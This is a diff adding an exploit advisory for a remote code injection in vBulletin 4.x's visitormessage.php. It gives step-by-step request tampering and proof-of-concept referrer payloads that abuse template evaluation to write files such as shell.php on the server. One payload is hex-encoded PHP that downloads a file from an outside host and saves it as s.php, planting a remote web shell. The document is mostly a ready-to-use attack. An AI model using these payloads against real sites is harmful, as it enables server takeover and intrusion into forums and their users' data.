@@ -1,0 +1,43 @@
+#################################################################################################################
+[+] Exploit Title: vBulletin 4.x.x 'visitormessage.php' Remote Code Injection Vulnerability
+[+] Discovered By: Dariush Nasirpour (Net.Edit0r)
+[+] My Homepage: black-hg.org / nasirpour.info
+[+] Date: [2015 27 February]
+[+] Vendor Homepage: vBulletin.com
+[+] Tested on: [vBulletin 4.2.2]
+[+] Greeting : Ali Razmjoo - Ehsan Nezami - Arash Shams - Ramin Shahkar and all my freinds ( #bhg )
+#################################################################################################################
+Remote Code Injection:
++++++++++++++++++++++++++
+1) You Must Register In The vBulletin http://server/register.php example:[blackhat]
+
+2) go to your user profile example: [http://server/members/blackhat.html]
+
+3) post something in visitor message and record post data with live http header
+
+[example] : message_backup=&message=For-Test-Sample&wysiwyg=1&sbutton=%D8%A7%D8%B1%D8%B3%D8%A7%D9%84+%D9%BE%DB%8C%D8%BA%D8%A7%D9%85&fromquickcomment=
+1&s=&securitytoken=1425024074-5bcfb5b83d466416ed95e80021abee86063cdf6e&do=message&u=110&u2=&loggedinuser=110&parseurl=1&lastcomment=1425022046&allow_ajax_qc=1&fromconverse=
+
+4- change message to anything "For-Test-Sample" => "ALEEEEEEEEX"  [because vBulletin don't let you send same comment in a time]
+
+[Now post this with hackbar:]
+
+URL:  http://server/visitormessage.php?do=message
+
+[Post data]
+message_backup=&message=ALEEEEEEEEX&wysiwyg=1&sbutton=%D8%A7%D8%B1%D8%B3%D8%A7%D9%84+%D9%BE%DB%8C%D8%BA%D8%A7%D9%85&fromquickcomment=
+1&s=&securitytoken=1425024074-5bcfb5b83d466416ed95e80021abee86063cdf6e&do=message&u=110&u2=&loggedinuser=110&parseurl=1&lastcomment=1425022046&allow_ajax_qc=1&fromconverse=
+
+[And referrer data:] 
+PoC : http://server/members/blackhat.html?a=$stylevar[${${file_put_contents("shell.php","hacked")}}]
+
+[Example referrer data:] > upload downloader.php and s.php
+PoC : http://server/members/g3n3rall.html?a=$stylevar%5b$%7b$%7bfile_put_contents(
+"downloader.php","\x3C\x3F\x70\x68\x70\x0D\x0A\x24\x68\x6F\x6D\x65\x70\x61\x67\x65\x20\x3D\x20\x66\x69\x6C\x65\x5F\x67\x65\x74\x5F\x63\x6F\x6E\x74\x65\x6E\x74\x73\x28\x27\x68\x74\x74\x70\x3A\x2F\x2F\x70\x61\x69\x65\x6E\x63\x68\x61\x74\x2E\x63\x6F\x6D\x2F\x64\x2F\x64\x72\x2E\x74\x78\x74\x27\x29\x3B\x0D\x0A\x24\x66\x20\x3D\x20\x66\x6F\x70\x65\x6E\x28\x27\x73\x2E\x70\x68\x70\x27\x2C\x27\x77\x27\x29\x3B\x0D\x0A\x66\x77\x72\x69\x74\x65\x28\x24\x66\x2C\x24\x68\x6F\x6D\x65\x70\x61\x67\x65\x29\x3B\x0D\x0A\x3F\x3E")}}]
+
+5- Open hackbar and tamper it with taper data:
+referrer data has been URL encoded by browser , you have to replace this again with tamper data: http://server/members/blackhat.html?a=$stylevar[${${file_put_contents("shell.php","hacked")}}]
+
+and submit request.
+
+################################################################################################################
